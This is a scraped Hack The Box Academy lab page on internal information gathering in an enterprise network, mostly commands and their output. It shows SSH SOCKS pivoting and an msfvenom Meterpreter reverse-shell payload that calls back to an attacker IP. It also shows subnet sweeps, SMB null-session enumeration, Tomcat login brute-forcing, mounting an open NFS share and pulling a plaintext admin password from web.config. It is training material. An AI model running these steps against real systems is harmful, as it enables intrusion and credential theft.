<!--
 // Platform: Academy
// URL: https://academy.hackthebox.com/module/163/section/1547
// Platform Version: V1
// Module ID: 163
// Module Name: Attacking Enterprise Networks
// Module Difficulty: Medium
// Section ID: 1547
// Section Title: Internal Information Gathering
// Page Title: Hack The Box - Academy
// Page Number: 8
-->

# Internal Information Gathering

**Module Name:** Attacking Enterprise Networks **Page Number:** 8

#### 

#### ATTACKING ENTERPRISE NETWORKS

# Internal Information Gathering

## Setting Up Pivoting - SSH

``` shell-session
ndefstathiou@htb[/htb]$ ssh -D 8081 -i dmz01_key root@10.129.203.111

Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-113-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 22 Jun 2022 12:08:31 AM UTC

  System load:                      0.21
  Usage of /:                       99.9% of 13.72GB
  Memory usage:                     65%
  Swap usage:                       0%
  Processes:                        458
  Users logged in:                  2
  IPv4 address for br-65c448355ed2: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for ens160:          10.129.203.111
  IPv6 address for ens160:          dead:beef::250:56ff:feb9:d30d
  IPv4 address for ens192:          172.16.8.120

  => / is using 99.9% of 13.72GB

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

97 updates can be applied immediately.
30 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


You have mail.
Last login: Tue Jun 21 19:53:01 2022 from 10.10.14.15
root@dmz01:~#
```

``` shell-session
ndefstathiou@htb[/htb]$ netstat -antp | grep 8081

(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
tcp        0      0 127.0.0.1:8081          0.0.0.0:*               LISTEN      122808/ssh          
tcp6       0      0 ::1:8081
```

``` shell-session
ndefstathiou@htb[/htb]$ grep socks4 /etc/proxychains.conf 

#	 	socks4	192.168.1.49	1080
#       proxy types: http, socks4, socks5
socks4 	127.0.0.1 8081
```

``` shell-session
ndefstathiou@htb[/htb]$ proxychains nmap -sT -p 21,22,80,8080 172.16.8.120

ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-21 21:15 EDT
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.120:80-<><>-OK
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.120:80-<><>-OK
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.120:22-<><>-OK
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.120:21-<><>-OK
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.120:8080-<><>-OK
Nmap scan report for 172.16.8.120
Host is up (0.13s latency).

PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 0.71 seconds
```

## Setting Up Pivoting - Metasploit

``` shell-session
ndefstathiou@htb[/htb]$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.14.15 LPORT=443 -f elf > shell.elf

[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 123 bytes
Final size of elf file: 207 bytes
```

``` shell-session
ndefstathiou@htb[/htb]$ scp -i dmz01_key shell.elf root@10.129.203.111:/tmp

shell.elf                                                                      100%  207     1.6KB/s   00:00
```

``` shell-session
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set payload linux/x86/meterpreter/reverse_tcp
payload => linux/x86/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set lhost 10.10.14.15 
lhost => 10.10.14.15
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LPORT 443
LPORT => 443
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> exploit

[*] Started reverse TCP handler on 10.10.14.15:443
```

``` shell-session
root@dmz01:/tmp# chmod +x shell.elf 
root@dmz01:/tmp# ./shell.elf
```

``` shell-session
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> exploit

[*] Started reverse TCP handler on 10.10.14.15:443 
[*] Sending stage (989032 bytes) to 10.129.203.111
[*] Meterpreter session 1 opened (10.10.14.15:443 -> 10.129.203.111:58462 ) at 2022-06-21 21:28:43 -0400

(Meterpreter 1)(/tmp) > getuid
Server username: root
```

``` shell-session
(Meterpreter 1)(/tmp) > background
[*] Backgrounding session 1...
[msf](Jobs:0 Agents:1) exploit(multi/handler) >> use post/multi/manage/autoroute 
[msf](Jobs:0 Agents:1) post(multi/manage/autoroute) >> show options 

Module options (post/multi/manage/autoroute):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CMD      autoadd          yes       Specify the autoroute command (Accepted: add, autoadd, print, delete, de
                                       fault)
   NETMASK  255.255.255.0    no        Netmask (IPv4 as "255.255.255.0" or CIDR as "/24"
   SESSION                   yes       The session to run this module on
   SUBNET                    no        Subnet (IPv4, for example, 10.10.10.0)

[msf](Jobs:0 Agents:1) post(multi/manage/autoroute) >> set SESSION 1
SESSION => 1
[msf](Jobs:0 Agents:1) post(multi/manage/autoroute) >> set subnet 172.16.8.0
subnet => 172.16.8.0
[msf](Jobs:0 Agents:1) post(multi/manage/autoroute) >> run

[!] SESSION may not be compatible with this module:
[!]  * incompatible session platform: linux
[*] Running module against 10.129.203.111
[*] Searching for subnets to autoroute.
[+] Route added to subnet 10.129.0.0/255.255.0.0 from host's routing table.
[+] Route added to subnet 172.16.0.0/255.255.0.0 from host's routing table.
[+] Route added to subnet 172.17.0.0/255.255.0.0 from host's routing table.
[+] Route added to subnet 172.18.0.0/255.255.0.0 from host's routing table.
[*] Post module execution completed
```

## Host Discovery - 172.16.8.0/23 Subnet - Metasploit

``` shell-session
[msf](Jobs:0 Agents:1) post(multi/manage/autoroute) >> use post/multi/gather/ping_sweep
[msf](Jobs:0 Agents:1) post(multi/gather/ping_sweep) >> show options 

Module options (post/multi/gather/ping_sweep):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       IP Range to perform ping sweep against.
   SESSION                   yes       The session to run this module on

[msf](Jobs:0 Agents:1) post(multi/gather/ping_sweep) >> set rhosts 172.16.8.0/23
rhosts => 172.16.8.0/23
[msf](Jobs:0 Agents:1) post(multi/gather/ping_sweep) >> set SESSION 1
SESSION => 1
[msf](Jobs:0 Agents:1) post(multi/gather/ping_sweep) >> run

[*] Performing ping sweep for IP range 172.16.8.0/23
[+] 	172.16.8.3 host found
[+] 	172.16.8.20 host found
[+] 	172.16.8.50 host found
[+] 	172.16.8.120 host found
```

## Host Discovery - 172.16.8.0/23 Subnet - SSH Tunnel

``` shell-session
root@dmz01:~# for i in $(seq 254); do ping 172.16.8.$i -c1 -W1 & done | grep from

64 bytes from 172.16.8.3: icmp_seq=1 ttl=128 time=0.472 ms
64 bytes from 172.16.8.20: icmp_seq=1 ttl=128 time=0.433 ms
64 bytes from 172.16.8.120: icmp_seq=1 ttl=64 time=0.031 ms
64 bytes from 172.16.8.50: icmp_seq=1 ttl=128 time=0.642 ms
```

## Host Enumeration

``` shell-session
root@dmz01:/tmp# ./nmap --open -iL live_hosts 

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2022-06-22 01:42 UTC
Unable to find nmap-services! Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.

Nmap scan report for 172.16.8.3
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.00064s latency).
Not shown: 1173 closed ports
PORT    STATE SERVICE
53/tcp  open  domain
88/tcp  open  kerberos
135/tcp open  epmap
139/tcp open  netbios-ssn
389/tcp open  ldap
445/tcp open  microsoft-ds
464/tcp open  kpasswd
593/tcp open  unknown
636/tcp open  ldaps
MAC Address: 00:50:56:B9:16:51 (Unknown)

Nmap scan report for 172.16.8.20
Host is up (0.00037s latency).
Not shown: 1175 closed ports
PORT     STATE SERVICE
80/tcp   open  http
111/tcp  open  sunrpc
135/tcp  open  epmap
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
2049/tcp open  nfs
3389/tcp open  ms-wbt-server
MAC Address: 00:50:56:B9:EC:36 (Unknown)

Nmap scan report for 172.16.8.50
Host is up (0.00038s latency).
Not shown: 1177 closed ports
PORT     STATE SERVICE
135/tcp  open  epmap
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
8080/tcp open  http-alt
MAC Address: 00:50:56:B9:B0:89 (Unknown)

Nmap done: 3 IP addresses (3 hosts up) scanned in 131.36 second
```

## Active Directory Quick Hits - SMB NULL SESSION

``` shell-session
ndefstathiou@htb[/htb]$ proxychains enum4linux -U -P 172.16.8.3

ProxyChains-3.1 (http://proxychains.sf.net)
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Jun 21 21:49:47 2022

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 172.16.8.3
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ================================================== 
|    Enumerating Workgroup/Domain on 172.16.8.3    |
 ================================================== 
[E] Can't find workgroup/domain


 =================================== 
|    Session Check on 172.16.8.3    |
 =================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.
[+] Server 172.16.8.3 allows sessions using username '', password ''
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 451.
[+] Got domain/workgroup name: 

 ========================================= 
|    Getting domain SID for 172.16.8.3    |
 ========================================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 359.
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.3:445-<><>-OK
Domain Name: INLANEFREIGHT
Domain Sid: S-1-5-21-2814148634-3729814499-1637837074
[+] Host is part of a domain (not a workgroup)

 =========================== 
|    Users on 172.16.8.3    |
 =========================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 866.
[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 881.
[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED

 ================================================== 
|    Password Policy Information for 172.16.8.3    |
 ================================================== 
[E] Unexpected error from polenum:
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.3:139-<><>-OK
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.3:445-<><>-OK


[+] Attaching to 172.16.8.3 using a NULL share

[+] Trying protocol 139/SMB...

	[!] Protocol failed: Cannot request session (Called Name:172.16.8.3)

[+] Trying protocol 445/SMB...

	[!] Protocol failed: SAMR SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 501.

[E] Failed to get password policy with rpcclient

enum4linux complete on Tue Jun 21 21:50:07 2022
```

## 172.16.8.50 - Tomcat

``` shell-session
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set rhosts 172.16.8.50
rhosts => 172.16.8.50
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set stop_on_success true
stop_on_success => true
msf6 auxiliary(scanner/http/tomcat_mgr_login) > run
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.50:8080-<><>-OK

[!] No active DB -- Credential data will not be saved!
[-] 172.16.8.50:8080 - LOGIN FAILED: admin:admin (Incorrect)
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.50:8080-<><>-OK
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.50:8080-<><>-OK
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.50:8080-<><>-OK
[-] 172.16.8.50:8080 - LOGIN FAILED: admin:manager (Incorrect)
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.50:8080-<><>-OK
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.50:8080-<><>-OK
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.50:8080-<><>-OK
[-] 172.16.8.50:8080 - LOGIN FAILED: admin:role1 (Incorrect)

<SNIP>

|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.50:8080-<><>-OK
[-] 172.16.8.50:8080 - LOGIN FAILED: tomcat:changethis (Incorrect)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

## Enumerating 172.16.8.20 - DotNetNuke (DNN)

![https://academy.hackthebox.com/storage/modules/163/ff_socks.png](https://academy.hackthebox.com/storage/modules/163/ff_socks.png)

![https://academy.hackthebox.com/storage/modules/163/dnn_homepage.png](https://academy.hackthebox.com/storage/modules/163/dnn_homepage.png)

``` shell-session
ndefstathiou@htb[/htb]$ proxychains showmount -e 172.16.8.20

ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.20:111-<><>-OK
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.20:2049-<><>-OK
Export list for 172.16.8.20:
/DEV01 (everyone)
```

``` shell-session
root@dmz01:/tmp# mkdir DEV01
root@dmz01:/tmp# mount -t nfs 172.16.8.20:/DEV01 /tmp/DEV01
root@dmz01:/tmp# cd DEV01/
root@dmz01:/tmp/DEV01# ls

BuildPackages.bat            CKToolbarButtons.xml  DNN       WatchersNET.CKEditor.sln
CKEditorDefaultSettings.xml  CKToolbarSets.xml
```

``` shell-session
root@dmz01:/tmp/DEV01# cd DNN
root@dmz01:/tmp/DEV01/DNN# ls

App_LocalResources                CKHtmlEditorProvider.cs  Options.aspx                 Web
Browser                           Constants                Options.aspx.cs              web.config
bundleconfig.json                 Content                  Options.aspx.designer.cs     web.Debug.config
CKEditorOptions.ascx              Controls                 packages.config              web.Deploy.config
CKEditorOptions.ascx.cs           Extensions               Properties                   web.Release.config
CKEditorOptions.ascx.designer.cs  Install                  UrlControl.ascx
CKEditorOptions.ascx.resx         Module                   Utilities
CKFinder                          Objects                  WatchersNET.CKEditor.csproj

root@dmz01:/tmp/DEV01/DNN#
```

``` shell-session
root@dmz01:/tmp/DEV01/DNN# cat web.config 

<?xml version="1.0"?>
<configuration>
  <!--
    For a description of web.config changes see http://go.microsoft.com/fwlink/?LinkId=235367.

    The following attributes can be set on the <httpRuntime> tag.
      <system.Web>
        <httpRuntime targetFramework="4.6.2" />
      </system.Web>
  -->
  <username>Administrator</username>
  <password>
	<value>D0tn31Nuk3R0ck$$@123</value>
  </password>
  <system.web>
    <compilation debug="true" targetFramework="4.5.2"/>
    <httpRuntime targetFramework="4.5.2"/>
  </system.web>
```

``` shell-session
root@dmz01:/tmp# tcpdump -i ens192 -s 65535 -w ilfreight_pcap

tcpdump: listening on ens192, link-type EN10MB (Ethernet), capture size 65535 bytes
^C2027 packets captured
2033 packets received by filter
0 packets dropped by kernel
```

## Moving On

# 

# 

#### Questions

####